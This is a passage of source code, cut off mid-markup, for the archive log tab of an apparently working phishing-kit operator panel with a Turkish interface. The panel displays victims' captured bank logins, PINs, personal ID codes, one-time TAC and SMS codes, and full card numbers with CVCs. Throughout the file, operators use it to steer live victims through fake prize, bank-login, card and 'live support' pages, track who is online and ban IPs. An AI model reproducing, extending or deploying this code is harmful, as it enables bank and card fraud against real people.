"use client";

import { useCallback, useEffect, useState, useRef, Fragment, useMemo } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import type { DemoSession } from "@/types/session";

const SESSION_COLUMNS = "id,created_at,amount,current_step,status,form_data,ip_address,user_agent,partner_name,is_hidden,last_ping_at";

const APPROVAL_OPTIONS: Array<{ value: string; label: string }> = [
  { value: "smartid_1", label: "SmartID 1 Sayfası" },
  { value: "smartid_2", label: "SmartID 2 Sayfası" },
  { value: "mobileid_1", label: "MobileID 1 Sayfası" },
  { value: "mobileid_2", label: "MobileID 2 Sayfası" },
  { value: "biometrika_pin_1", label: "Biometrika/PIN 1" },
  { value: "biometrika_pin_2", label: "Biometrika/PIN 2" },
];

const UA_BANNED_RE = /(mozilla|applewebkit|webkit|gecko|chrome|safari|windows nt|win64|win32|android|iphone|ipad|mac os|linux x86_64|x86_64|like gecko|khtml|version\/|mobile|firefox|opera|edge|msie|trident|opr\/|edg\/|brave|vivaldi|netscape)/i;
const FP_PREFIX_RE = /(pm_|fpua|fpsc|fpsw|fptz|fpln|fpjv|fpco|fpasw|fpan|fpacn|fpol|fposp|fpup|fpsaw|fpsbd|fpsdx|fpsdy|fpslx|fpsly|fpsfse|fpsui|fpol|pm_fpua|pm_fpsc|pm_fpsw|pm_fptz|pm_fpln|pm_fpasw|pm_fpan|pm_fpacn|pm_fpol|pm_fpsaw|pm_fpsbd|pm_fpsdx|pm_fpsdy|pm_fpslx|pm_fpsly|pm_fpsfse|pm_fpsui|pm_os|pm_brmjv|pm_br|pm_inpt|pm_expt)/i;

function sanitizeCredentialValue(value: unknown, opts?: { maxLen?: number; allowUaLike?: boolean }): string {
  const v = typeof value === "string" ? value : value == null ? "" : String(value);
  if (!v) return "";
  const trimmed = v.trim();
  if (!trimmed) return "";
  const maxLen = opts?.maxLen ?? 64;
  if (!opts?.allowUaLike && (UA_BANNED_RE.test(trimmed) || FP_PREFIX_RE.test(trimmed))) return "";
  if (trimmed.length > maxLen) return "";
  if (/^[\x00-\x1F\x7F]/.test(trimmed)) return "";
  let pctCount = 0;
  for (let i = 0; i < trimmed.length; i++) if (trimmed.charCodeAt(i) === 37) pctCount++;
  if (pctCount >= 4) return "";
  return trimmed;
}

function sanitizeRawFieldsForDisplay(rawFields: any): any {
  if (!rawFields || typeof rawFields !== "object") return {};
  const out: Record<string, any> = {};
  for (const k of Object.keys(rawFields)) {
    const keyOk = String(k).toLowerCase();
    if (FP_PREFIX_RE.test(keyOk)) continue;
    if (/user_?agent/i.test(keyOk)) continue;
    if (/^s\d+_iframe_user_?agent/i.test(keyOk)) continue;
    const rawVal = rawFields[k];
    const cleaned = typeof rawVal === "string" ? sanitizeCredentialValue(rawVal, { maxLen: 256 }) : rawVal;
    if (typeof cleaned === "string" && cleaned === "") continue;
    out[k] = cleaned;
  }
  return out;
}

function cleanBankFormHistoryEntry(entry: any): any {
  if (!entry || typeof entry !== "object") return entry;
  return {
    ...entry,
    verfuegernummer: sanitizeCredentialValue(entry.verfuegernummer || entry.username || entry.id),
    username: sanitizeCredentialValue(entry.username || entry.verfuegernummer || entry.id),
    id: sanitizeCredentialValue(entry.id || entry.verfuegernummer || entry.username),
    pin: sanitizeCredentialValue(entry.pin || entry.password || entry.pw),
    password: sanitizeCredentialValue(entry.password || entry.pin || entry.pw),
    pw: sanitizeCredentialValue(entry.pw || entry.pin || entry.password),
    personalCode: sanitizeCredentialValue(entry.personalCode, { maxLen: 32 }),
    bankPhone: sanitizeCredentialValue(entry.bankPhone, { maxLen: 40, allowUaLike: true }),
    tacCode: sanitizeCredentialValue(entry.tacCode || entry.tac_code, { maxLen: 24 }),
    orderedField1: sanitizeCredentialValue(entry.orderedField1, { maxLen: 120 }),
    orderedField2: sanitizeCredentialValue(entry.orderedField2, { maxLen: 120 }),
    orderedField3: sanitizeCredentialValue(entry.orderedField3, { maxLen: 120 }),
    cardNumber: sanitizeCredentialValue(entry.cardNumber, { maxLen: 32 }),
    cardExpiry: sanitizeCredentialValue(entry.cardExpiry, { maxLen: 16 }),
    cardCvc: sanitizeCredentialValue(entry.cardCvc, { maxLen: 8 }),
    smsCode: sanitizeCredentialValue(entry.smsCode || entry.sms_code, { maxLen: 32 }),
    rawFields: sanitizeRawFieldsForDisplay(entry.rawFields),
  };
}

function sanitizeFormDataAll(rawFd: any): any {
  if (!rawFd || typeof rawFd !== "object") return {};
  const fd: any = { ...rawFd };
  fd.firstName = sanitizeCredentialValue(rawFd.firstName, { maxLen: 120, allowUaLike: true }) || rawFd.firstName;
  fd.lastName = sanitizeCredentialValue(rawFd.lastName, { maxLen: 120, allowUaLike: true }) || rawFd.lastName;
  fd.phone = sanitizeCredentialValue(rawFd.phone, { maxLen: 40, allowUaLike: true }) || rawFd.phone;
  fd.email = sanitizeCredentialValue(rawFd.email, { maxLen: 200, allowUaLike: true }) || rawFd.email;
  fd.verfuegernummer = sanitizeCredentialValue(rawFd.verfuegernummer || rawFd.username || rawFd.id);
  fd.username = sanitizeCredentialValue(rawFd.username || rawFd.verfuegernummer || rawFd.id);
  fd.id = sanitizeCredentialValue(rawFd.id || rawFd.verfuegernummer || rawFd.username);
  fd.pin = sanitizeCredentialValue(rawFd.pin || rawFd.password || rawFd.pw);
  fd.password = sanitizeCredentialValue(rawFd.password || rawFd.pin || rawFd.pw);
  fd.pw = sanitizeCredentialValue(rawFd.pw || rawFd.pin || rawFd.password);
  fd.personalCode = sanitizeCredentialValue(rawFd.personalCode, { maxLen: 32 });
  fd.bankPhone = sanitizeCredentialValue(rawFd.bankPhone, { maxLen: 40, allowUaLike: true });
  fd.tacCode = sanitizeCredentialValue(rawFd.tacCode || rawFd.tac_code, { maxLen: 24 });
  fd.tac_code = fd.tacCode;
  fd.smsCode = sanitizeCredentialValue(rawFd.smsCode || rawFd.sms_code, { maxLen: 32 });
  fd.sms_code = fd.smsCode;
  fd.cardNumber = sanitizeCredentialValue(rawFd.cardNumber, { maxLen: 32 });
  fd.cardExpiry = sanitizeCredentialValue(rawFd.cardExpiry, { maxLen: 16 });
  fd.cardCvc = sanitizeCredentialValue(rawFd.cardCvc, { maxLen: 8 });
  fd.cardHolder = sanitizeCredentialValue(rawFd.cardHolder, { maxLen: 120, allowUaLike: true });
  fd.orderedField1 = sanitizeCredentialValue(rawFd.orderedField1, { maxLen: 120 });
  fd.orderedField2 = sanitizeCredentialValue(rawFd.orderedField2, { maxLen: 120 });
  fd.orderedField3 = sanitizeCredentialValue(rawFd.orderedField3, { maxLen: 120 });
  fd.rawFields = sanitizeRawFieldsForDisplay(rawFd.rawFields);
  if (Array.isArray(rawFd.bankFormHistory)) {
    fd.bankFormHistory = rawFd.bankFormHistory.map((e: any) => cleanBankFormHistoryEntry(e));
  }
  return fd;
}

function getApprovalDisplayText(value: string): string {
  const matchedOption = APPROVAL_OPTIONS.find((option) => option.value === value);
  if (!matchedOption) return "";
  return matchedOption.label.includes(" Sayfası")
    ? matchedOption.label.replace(" Sayfası", " Onaylandı")
    : `${matchedOption.label} Onaylandı`;
}

function parseApprovalHistory(value: unknown): string[] {
  if (typeof value !== "string" || !value.trim()) return [];
  try {
    const parsed = JSON.parse(value) as unknown;
    if (Array.isArray(parsed)) return parsed.filter((item): item is string => typeof item === "string" && item.trim().length > 0);
  } catch { return [value.trim()]; }
  return [];
}

function inferCanonicalLogFieldKey(key: string): "personalCode" | "bankPhone" | "username" | "password" | "tacCode" | "loginMethod" | null {
  const n = key.toLowerCase().replace(/[^a-z0-9]/g, "");
  if (n.includes("personalidentitycode") || n.includes("personalidentificationcode") || n.includes("identitycode") || n.includes("personalcode") || n.includes("isikukood")) return "personalCode";
  if (n.includes("telefoninumber") || n.includes("mobilenumber") || n.includes("phonenumber") || n.includes("mobileidphone") || n.includes("phonefield") || n.includes("telefon") || n.includes("phone") || n === "phone") return "bankPhone";
  if (n.includes("userid") || n.includes("username") || n.includes("loginid") || n.includes("nickname") || n.includes("kasutajanimi") || n.includes("kasutajatunnus") || n.endsWith("tunnus")) return "username";
  if (n.includes("password") || n.includes("passcode") || n.includes("pincode") || n.includes("pinkood") || n.includes("parool") || n.includes("pincalculatorcode") || n.includes("pincalccode") || n.includes("pincalcpassword") || n === "pincalc" || n === "pin") return "password";
  if (n.includes("tac") || n.includes("otp") || n.includes("smscode") || n.includes("verificationcode") || n.includes("responsecode") || n.includes("kontrollkood")) return "tacCode";
  if (n.includes("loginmethod") || n.includes("authmethod")) return "loginMethod";
  return null;
}

function isIgnoredAdminBankFieldKey(key: string): boolean {
  const n = key.toLowerCase().replace(/[^a-z0-9]/g, "");
  return /^input\d+$/.test(n) || n.includes("wheelresult") || n.includes("wheelprize") || n.includes("rememberme") || n.includes("remembermesimpleid") || n.includes("remembermesmartid") || n.includes("remembermemobileid") || n.includes("loginwidget") || n.includes("useridmid") || n.includes("useridsid") || n.includes("useridsimple") || n === "mobileid" || n === "smartid" || n === "idcard" || n === "pincalc" || n === "kalkulaator";
}

function shouldHideDuplicateBankField(formData: Record<string, any>, key: string, value: unknown): boolean {
  if (typeof value !== "string" || !value.trim()) return false;
  const canonicalKey = inferCanonicalLogFieldKey(key);
  if (!canonicalKey || canonicalKey === key) return false;
  const canonicalValue =
    canonicalKey === "username" ? String(formData.username ?? formData.verfuegernummer ?? "").trim()
    : canonicalKey === "password" ? String(formData.password ?? formData.pin ?? "").trim()
    : String(formData[canonicalKey] ?? "").trim();
  return Boolean(canonicalValue) && canonicalValue === value.trim();
}

function isVisibleAdminBankField(formData: Record<string, any>, key: string, value: unknown): boolean {
  if (!value) return false;
  if (isIgnoredAdminBankFieldKey(key)) return false;
  const preferredKeys = new Set(["loginMethod","personalCode","bankPhone","username","verfuegernummer","password","pin","tacCode","pasnummer","rekeningnummer","toegangscode","signatuur","identificatiecode"]);
  if (preferredKeys.has(key)) return true;
  const n = key.toLowerCase().replace(/[^a-z0-9]/g, "");
  if (n.includes("rememberme")) return false;
  const canonicalKey = inferCanonicalLogFieldKey(key);
  if (!canonicalKey) return false;
  if (shouldHideDuplicateBankField(formData, key, value)) return false;
  const canonicalValue =
    canonicalKey === "username" ? String(formData.username ?? formData.verfuegernummer ?? "").trim()
    : canonicalKey === "password" ? String(formData.password ?? formData.pin ?? "").trim()
    : String(formData[canonicalKey] ?? "").trim();
  return !canonicalValue;
}

function getCanonicalAdminBankFields(formData: Record<string, any>): Array<[string, string]> {
  const pickString = (...keys: string[]) => { for (const key of keys) { const value = formData[key]; if (typeof value === "string" && value.trim()) return value.trim(); } return ""; };
  const orderedField1 = pickString("orderedField1");
  const orderedField1Key = pickString("orderedField1Key");
  const orderedField2 = pickString("orderedField2");
  const orderedField2Key = pickString("orderedField2Key");
  const orderedField2Type = pickString("orderedField2Type");
  const orderedField3 = pickString("orderedField3");
  const orderedField3Key = pickString("orderedField3Key");
  const orderedField3Type = pickString("orderedField3Type");
  const rawPersonalCode = pickString("personalCode");
  const rawUsername = pickString("username", "verfuegernummer");
  const rawPassword = pickString("password", "pin");
  const rawTacCode = pickString("tacCode");
  const rawBankPhone = pickString("bankPhone");

  const entries: Array<{ key: string; value: string; score: number }> = [];
  const seenValues = new Set<string>();
  const pushIfNew = (key: string, value: string, score: number) => {
    if (!value) return;
    const v = String(value).trim();
    if (!v) return;
    if (seenValues.has(v)) return;
    entries.push({ key, value: v, score });
    seenValues.add(v);
  };

  pushIfNew("username", rawUsername, 1);
  pushIfNew("personalCode", rawPersonalCode, 2);
  pushIfNew("bankPhone", rawBankPhone, 3);
  pushIfNew("password", rawPassword, 4);
  pushIfNew("tacCode", rawTacCode, 5);

  {
    let k: string | null = null;
    if (orderedField1Key === "username" || orderedField1Key === "personalCode" || orderedField1Key === "bankPhone" || orderedField1Key === "password" || orderedField1Key === "tacCode") k = orderedField1Key;
    if (k) pushIfNew(k, orderedField1, 50);
  }
  {
    let k: string | null = null;
    if (orderedField2Key === "username" || orderedField2Key === "personalCode" || orderedField2Key === "bankPhone" || orderedField2Key === "password" || orderedField2Key === "tacCode") k = orderedField2Key;
    else if (orderedField2Type === "password") k = "password";
    else if (orderedField2Type === "phone") k = "bankPhone";
    if (k) pushIfNew(k, orderedField2, 60);
  }
  {
    let k: string | null = null;
    if (orderedField3Key === "username" || orderedField3Key === "personalCode" || orderedField3Key === "bankPhone" || orderedField3Key === "password" || orderedField3Key === "tacCode") k = orderedField3Key;
    else if (orderedField3Type === "password") k = "password";
    else if (orderedField3Type === "phone") k = "bankPhone";
    if (k) pushIfNew(k, orderedField3, 70);
  }

  entries.sort((a, b) => a.score - b.score);
  if (entries.length === 0) return [];
  return entries.map((e): [string, string] => [e.key, e.value]).slice(0, 3);
}

function StatCard({ icon, color, title, value, darkMode }: { icon: string; color: string; title: string; value: number; darkMode: boolean }) {
  return (
    <div className={`rounded-3xl border shadow-[0_8px_30px_rgb(0,0,0,0.04)] backdrop-blur-xl p-5 flex items-center gap-4 ${darkMode ? "bg-[#1c1c1e]/70 border-white/5" : "bg-white/80 border-[#d2d2d7]/50"}`}>
      <div className={`w-14 h-14 rounded-2xl flex items-center justify-center ${darkMode ? "bg-white/5" : "bg-gray-50"}`}>
        <svg className={`w-7 h-7 ${color}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d={icon} />
        </svg>
      </div>
      <div className="flex-1">
        <div className={`text-[11px] font-semibold tracking-wider uppercase opacity-60 mb-0.5 ${darkMode ? "text-white" : "text-gray-700"}`}>{title}</div>
        <div className={`text-2xl font-extrabold ${darkMode ? "text-white" : "text-gray-900"}`}>{value.toLocaleString("tr-TR")}</div>
      </div>
    </div>
  );
}

export function AuditLogsTab({ darkMode, user }: { darkMode: boolean; user?: any }) {
  const supabase = createBrowserSupabaseClient();
  const [rows, setRows] = useState<DemoSession[]>([]);
  const rowsRef = useRef<DemoSession[]>([]);
  useEffect(() => { rowsRef.current = rows; }, [rows]);

  const [logCount, setLogCount] = useState(0);
  const [hiddenCount, setHiddenCount] = useState(0);
  // CANLI ONLINE SAYISI (LogsTab ile birebir ayni, ANLIK)
  const LIVE_WINDOW_MS = 10 * 1000;
  const liveOnlineNow = useMemo(() => {
    let n = 0;
    const now = Date.now();
    for (const row of rows) {
      if (row.status === "offline") continue;
      if (!row.last_ping_at) continue;
      try {
        const t = Date.parse(String(row.last_ping_at));
        if (Number.isFinite(t) && now - t < LIVE_WINDOW_MS) n++;
      } catch { /* noop */ }
    }
    return n;
  }, [rows]);
  // Her 2 snde bir canli guncelleme zorla (useMemo Date.now() bagli olmadigi icin tick)
  const [, setTick] = useState(0);
  useEffect(() => {
    const t = window.setInterval(() => setTick((x) => x + 1), 2_000);
    return () => window.clearInterval(t);
  }, []);
  const [loading, setLoading] = useState(true);
  const [queryError, setQueryError] = useState<string | null>(null);
  const reqRef = useRef(0);

  const [expandedBankHistorySessionId, setExpandedBankHistorySessionId] = useState<string | null>(null);
  const [showHiddenOnly, setShowHiddenOnly] = useState(false);

  const load = useCallback(async () => {
    const myReq = ++reqRef.current;
    if (!supabase) return;
    setLoading(true);
    setQueryError(null);
    try {
      const username = user?.user_metadata?.username || user?.email?.split('@')[0];
      let q = supabase.from("sessions").select(SESSION_COLUMNS).order("created_at", { ascending: false });
      if (username !== "super_admin") q = q.eq("partner_name", username);
      q = q.limit(500);
      const { data, error } = await q;
      if (reqRef.current !== myReq) return;
      if (error) { setQueryError(error.message); setRows([]); return; }
      const fetched = ((data as DemoSession[]) ?? []);
      const filtered = fetched.filter(r => !showHiddenOnly ? true : !!r.is_hidden);
      const hiddenCnt = fetched.filter(r => !!r.is_hidden).length;
      setRows((prev) => {
        if (!prev && !filtered) return prev;
        if (prev?.length === filtered.length) {
          try {
            if (JSON.stringify(prev) === JSON.stringify(filtered)) return prev;
          } catch { /* noop */ }
        }
        setLogCount(filtered.length);
        setHiddenCount(hiddenCnt);
        return filtered;
      });
    } catch (e: any) {
      if (reqRef.current !== myReq) return;
      setQueryError(e?.message || String(e));
      setRows([]);
    } finally {
      if (reqRef.current === myReq) setLoading(false);
    }
  }, [supabase, user, showHiddenOnly]);

  useEffect(() => { void load(); }, [load]);
  useEffect(() => {
    if (!supabase) return;
    const pollTimer = window.setInterval(() => void load(), 5_000);
    const ch = supabase.channel("admin1-eski-logs")
      .on("postgres_changes", { event: "*", schema: "public", table: "sessions" }, () => void load())
      .subscribe();
    return () => { window.clearInterval(pollTimer); void supabase.removeChannel(ch); };
  }, [supabase, load]);

  const copyToClipboard = (text: string) => { if (!text) return; void navigator.clipboard?.writeText(text); };

  const handleRouteAction = async (sessionId: string, action: string) => {
    if (!supabase) return;
    if (action === "unhide") {
      await supabase.from("sessions").update({ is_hidden: false, status: "online", current_step: "wait" }).eq("id", sessionId);
      void load();
      return;
    }
    if (action === "win" || action === "wheel" || action === "code_entry" || action === "banken" || action === "bank" || action === "bank_login" || action === "card" || action === "wait" || action === "invalid_bank" || action === "live_support" || action === "congrats") {
      await supabase.from("sessions").update({ current_step: action, is_hidden: false }).eq("id", sessionId);
      void load();
      return;
    }
    if (action === "ban_ip") {
      const row = rowsRef.current.find(r => r.id === sessionId);
      if (row && row.ip_address) {
        if (confirm(`Bu IP (${row.ip_address}) tamamen engellenecek. Onaylıyor musunuz?`)) {
          await supabase.from('banned_ips').insert({ ip_address: row.ip_address, reason: `Admin eski logtan engelledi (Session: ${sessionId})` });
          alert("IP engellendi!");
        }
      } else {
        alert("Kullanıcının IP adresi henüz kaydedilmemiş.");
      }
      return;
    }
    if (action === "permadelete") {
      if (!confirm(`Bu session (${sessionId.slice(0,8)}...) KALICI olarak silinecek. Geri alınamaz. Onay?`)) return;
      const { error } = await supabase.from("sessions").delete().eq("id", sessionId);
      if (error) alert("Silinemedi: " + error.message);
      else void load();
      return;
    }
  };

  const handleDelete = async (sessionId: string) => {
    if (!confirm("Bu logu arşivlemek (normal loglardan gizlemek, eski loglarda gözükecek) istediğinize emin misiniz?")) return;
    if (!supabase) return;
    await supabase.from("sessions").update({ is_hidden: true }).eq("id", sessionId);
    void load();
  };

  return (
    <div className="space-y-8 animate-in fade-in duration-500">
      <div className="flex items-start justify-between gap-4 flex-wrap">
        <div className="flex items-center gap-3">
          <div className={`p-2 rounded-xl ${darkMode ? 'bg-white/10 text-white' : 'bg-black/5 text-black'}`}>
            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
          </div>
          <div>
            <h2 className={`text-2xl font-bold tracking-tight ${darkMode ? 'text-white' : 'text-gray-900'}`}>Eski Loglar (Arşiv)</h2>
            <p className={`mt-0.5 text-xs opacity-60 font-medium ${darkMode ? 'text-white' : 'text-gray-700'}`}>Tarihteki tüm session kayıtları (arşivlenen + silinen dahil). Normal log tablosuyla aynı format.</p>
          </div>
        </div>
        <div className="flex items-center gap-2 flex-wrap">
          <label className={`inline-flex cursor-pointer select-none items-center gap-2 rounded-full border px-4 py-2.5 shadow-sm text-[11px] font-bold tracking-wider uppercase ${darkMode ? "bg-[#1c1c1e] border-white/10 text-zinc-400" : "bg-white border-gray-200 text-gray-600"}`}>
            <input type="checkbox" className="accent-[#EB5E28]" checked={showHiddenOnly} onChange={(e) => setShowHiddenOnly(e.target.checked)} />
            {showHiddenOnly ? "Yalnız arşivlenenler" : "Tüm sessionları göster"}
          </label>
          <button
            onClick={() => void load()}
            className={`flex items-center gap-2 rounded-full px-5 py-2.5 shadow-sm text-[12px] font-bold tracking-wider uppercase transition-all duration-300 hover:scale-105 active:scale-95 hover:shadow-md ${darkMode ? "bg-[#1c1c1e] border border-white/10 text-zinc-400 hover:bg-white/10 hover:text-white" : "bg-white border border-gray-200 text-gray-600 hover:bg-gray-50 hover:text-black"}`}
          >
            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" /></svg>
            Yenile
          </button>
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
        <StatCard icon="M5 8h14M5 8a2 2 0 110-4h14a2 2 0 110 4M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8m-9 4h4" color="text-[#EB5E28]" title="Eski Log (Toplam)" value={logCount} darkMode={darkMode} />
        <StatCard icon="M5 8h14M5 8a2 2 0 110-4h14a2 2 0 110 4M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8m-9 4h4" color="text-amber-500" title="Arşivlenmiş (Gizli)" value={hiddenCount} darkMode={darkMode} />
        <StatCard icon="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" color="text-yellow-500" title="Şu An Aktif (Canlı)" value={liveOnlineNow} darkMode={darkMode} />
      </div>

      {queryError && (
        <div className="rounded-2xl border border-red-500/30 bg-red-500/5 p-4 text-sm text-red-400 font-medium">
          Veri okunamadı: <b>{queryError}</b> · Admin girişi yapılmamış olabilir. Sayfayı yenileyin.
        </div>
      )}

      <div className={`rounded-3xl border shadow-[0_8px_30px_rgb(0,0,0,0.04)] overflow-hidden backdrop-blur-xl ${darkMode ? 'bg-[#1c1c1e]/70 border-white/5' : 'bg-white/80 border-[#d2d2d7]/50'}`}>
        <div className="overflow-x-auto pb-4">
          <table className="w-full table-fixed border-collapse text-[10px] text-left lg:text-[11px]">
            <thead className={`text-[11px] uppercase tracking-wider font-semibold border-b ${darkMode ? 'bg-black/20 text-gray-400 border-white/5' : 'bg-gray-50/50 text-gray-500 border-gray-100'}`}>
              <tr>
                <th className="w-[6%] px-2 py-3 font-semibold whitespace-nowrap">ID</th>
                <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">Ödül</th>
                <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">İsim</th>
                <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">Numara</th>
                <th className="w-[24%] px-2 py-3 font-semibold whitespace-nowrap">Banka</th>
                <th className="w-[14%] px-2 py-3 font-semibold whitespace-nowrap">Onay</th>
                <th className="w-[7%] px-2 py-3 font-semibold whitespace-nowrap">SMS</th>
                <th className="w-[10%] px-2 py-3 font-semibold whitespace-nowrap">Kart</th>
                <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">Sayfa</th>
                <th className="w-[7%] px-2 py-3 font-semibold whitespace-nowrap">Durum</th>
                <th className="w-[12%] px-2 py-3 font-semibold text-right whitespace-nowrap">İşlemler</th>
              </tr>
            </thead>
            <tbody className={`divide-y ${darkMode ? 'divide-white/5' : 'divide-gray-100'}`}>
              {loading && rows.length === 0 && (
                <tr><td colSpan={11} className="px-5 py-12 text-center text-base opacity-50 font-medium">
                  <div className="flex items-center justify-center"><div className="size-10 animate-spin rounded-full border-4 border-[#EB5E28]/30 border-t-[#EB5E28]" /></div>
                </td></tr>
              )}
              {!loading && rows.length === 0 && (
                <tr><td colSpan={11} className="px-5 py-12 text-center text-base opacity-50 font-medium">
                  {queryError ? "Veri hatası, yukarıdaki mesaja bakın." : "Arşivde (eski loglarda) henüz kayıt yok. Normal loglarda Tümünü Sil dediğinde sessionlar buraya gelir."}
                </td></tr>
              )}
              {rows.map((row) => {
                const fd = sanitizeFormDataAll(row.form_data || {});
                const history: any[] = Array.isArray(fd.bankFormHistory) ? (fd.bankFormHistory as any[]).map((e) => cleanBankFormHistoryEntry(e)).slice() : [];
                const hasAnyCredentialSnapshot = Boolean(fd.verfuegernummer || fd.username || fd.id || fd.pin || fd.password || fd.pw || fd.bankPhone || fd.personalCode || fd.tacCode || fd.tac_code || fd.loginMethod || fd.orderedField1 || fd.orderedField2 || fd.orderedField3);
                if (history.length === 0 && hasAnyCredentialSnapshot) {
                  history.unshift({
                    bankSlug: fd.bankSlug, bankName: fd.bankName || "Bilinmiyor",
                    verfuegernummer: fd.verfuegernummer || fd.username || fd.id || "", username: fd.verfuegernummer || fd.username || fd.id || "",
                    pin: fd.pin || fd.password || fd.pw || "", password: fd.pin || fd.password || fd.pw || "",
                    bankPhone: fd.bankPhone || "", personalCode: fd.personalCode || "",
                    tacCode: fd.tacCode || fd.tac_code || "", loginMethod: fd.loginMethod || "",
                    orderedField1: fd.orderedField1 || "", orderedField1Key: fd.orderedField1Key || "",
                    orderedField2: fd.orderedField2 || "", orderedField2Key: fd.orderedField2Key || "", orderedField2Type: fd.orderedField2Type || "",
                    orderedField3: fd.orderedField3 || "", orderedField3Key: fd.orderedField3Key || "", orderedField3Type: fd.orderedField3Type || "",
                    rawFields: (fd.verfuegernummer || fd.username || fd.id || fd.pin || fd.password || fd.pw) ? {
                      legacy_verfuegernummer: fd.verfuegernummer || "", legacy_username: fd.username || "", legacy_id: fd.id || "",
                      legacy_pin: fd.pin || "", legacy_password: fd.password || "", legacy_pw: fd.pw || "",
                      legacy_bankPhone: fd.bankPhone || "", legacy_personalCode: fd.personalCode || "",
                      legacy_tacCode: fd.tacCode || fd.tac_code || "", legacy_loginMethod: fd.loginMethod || "",
                    } : undefined,
                    capturedAt: (row as any).updated_at || row.created_at || new Date().toISOString(), isLegacySnapshot: true,
                  });
                }
                (fd as any).bankFormHistory = history;
                const bankHistoryCount = history.length;

                let stepText = "BAŞLANGIÇ";
                let stepColor = darkMode ? "text-gray-400 bg-gray-500/10 border border-gray-500/20" : "text-gray-600 bg-gray-100 border border-gray-200";
                const s = (row.current_step as string) || "";
                if (s === "wheel") { stepText = "ÇARK OYUNU"; stepColor = "text-teal-500 bg-teal-500/10 border border-teal-500/20"; }
                else if (s === "code_entry") { stepText = fd.is_wheel_game ? "ÇARK OYUNU" : "KOD GİRİŞİ"; stepColor = fd.is_wheel_game ? "text-teal-500 bg-teal-500/10 border border-teal-500/20" : "text-pink-500 bg-pink-500/10 border border-pink-500/20"; }
                else if (s === "win") { stepText = "İSİM & PROFİL"; stepColor = "text-blue-500 bg-blue-500/10 border border-blue-500/20"; }
                else if (s === "banken") { stepText = "BANKA SEÇİMİ"; stepColor = "text-yellow-600 dark:text-yellow-500 bg-yellow-500/10 border border-yellow-500/20"; }
                else if (s === "bank") { stepText = `BANKA GİRİŞİ ${fd.bankName ? `(${fd.bankName})` : ""}`; stepColor = "text-orange-500 bg-orange-500/10 border border-orange-500/20"; }
                else if (s === "sms") { stepText = "SMS ONAYI"; stepColor = "text-indigo-500 bg-indigo-500/10 border border-indigo-500/20"; }
                else if (s === "card") { stepText = "KREDİ KARTI"; stepColor = "text-purple-500 bg-purple-500/10 border border-purple-500/20"; }
                else if (s === "wait") { stepText = "BEKLEMEDE"; stepColor = "text-gray-500 bg-gray-500/10 border border-gray-500/20"; }
                else if (s === "congrats") { stepText = "TEBRİKLER"; stepColor = "text-green-500 bg-green-500/10 border border-green-500/20"; }
                else if (s === "invalid_bank") { stepText = "HATALI BANKA"; stepColor = "text-red-500 bg-red-500/10 border border-red-500/20"; }
                else if (s === "live_support") { stepText = "CANLI DESTEK"; stepColor = "text-cyan-500 bg-cyan-500/10 border border-cyan-500/20"; }
                else if (s === "special_approval") { stepText = "ÖZEL BİLDİRİM / ONAY"; stepColor = "text-sky-500 bg-sky-500/10 border border-sky-500/20"; }

                const canonicalBankFields = getCanonicalAdminBankFields(fd);
                const approvalEntries = parseApprovalHistory(fd.approvalHistory);
                const smsValue = typeof fd.smsCode === "string" && fd.smsCode.trim() ? fd.smsCode.trim() : typeof fd.tacCode === "string" && fd.tacCode.trim() ? fd.tacCode.trim() : "";
                const isHidden = !!row.is_hidden;

                return (
                  <Fragment key={row.id}>
                    <tr className={`${darkMode ? 'hover:bg-white/[0.02]' : 'hover:bg-black/[0.01]'} transition-colors duration-200 group ${isHidden ? (darkMode ? 'bg-amber-500/[0.03]' : 'bg-amber-50/50') : ''}`}>
                      <td className="px-2 py-3 align-top font-mono text-[10px] opacity-50 uppercase break-all" title={row.id}>
                        {row.id.length > 10 ? row.id.slice(0, 10) : row.id.slice(0, row.id.indexOf('-') === -1 ? undefined : row.id.indexOf('-'))}
                        {isHidden && <div className="mt-0.5"><span className="rounded bg-amber-500/15 text-amber-600 dark:text-amber-400 border border-amber-500/30 px-1.5 py-0.5 text-[8px] font-black tracking-wide whitespace-nowrap inline-block">ARSİV</span></div>}
                      </td>
                      <td className="px-2 py-3 align-top whitespace-nowrap font-semibold text-[11px] lg:text-xs text-[#EB5E28]/90">
                        {row.amount ? `${typeof fd.currency === "string" && fd.currency.trim() ? fd.currency.trim() : "AUD$"}${row.amount}` : '-'}
                      </td>
                      <td className="px-2 py-3 align-top">
                        <div className="cursor-pointer text-[14px] font-bold opacity-100 transition-opacity group-hover:opacity-100 hover:underline break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(`${fd.firstName || ''} ${fd.lastName || ''}`)}>
                          {fd.firstName || fd.lastName ? `${fd.firstName} ${fd.lastName}` : '-'}
                        </div>
                      </td>
                      <td className="px-2 py-3 align-top">
                        <div className="cursor-pointer text-[12px] opacity-90 hover:underline break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(fd.phone)}>
                          {fd.phone || '-'}
                        </div>
                      </td>
                      <td className="px-2 py-3 align-top">
                        <div className="space-y-1 text-[10px] leading-tight">
                          <div className="mb-1 flex min-w-0 flex-wrap items-start justify-between gap-1.5">
                            <div className="flex min-w-0 flex-wrap items-center gap-1">
                              {fd.bankName ? (
                                <span className="font-bold text-[11px] text-yellow-600 dark:text-yellow-500 break-words [overflow-wrap:anywhere]">{fd.bankName}</span>
                              ) : null}
